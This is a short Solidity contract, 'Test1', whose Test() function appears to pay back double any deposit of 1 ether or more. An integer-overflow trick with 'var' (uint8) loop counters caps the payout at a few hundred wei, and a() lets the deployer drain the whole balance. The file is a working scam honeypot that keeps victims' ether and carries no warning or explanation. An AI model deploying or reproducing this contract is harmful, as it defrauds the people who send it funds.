// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Test1
{
    address b = msg.sender;

    function a()
    payable
    public
    {
        require(msg.sender==b);
        b.transfer(this.balance);
    }

    function() payable {}

    function Test()
    payable
    public
    {
        if(msg.value>=1 ether)
        {

            var e = 1;
            var d = 0;
            var c = msg.value*2;

            while(true)
            {
                if(e<d)break;
                if(e>c)break;

                d=e;
                e++;
            }
            msg.sender.transfer(d);
        }
    }
}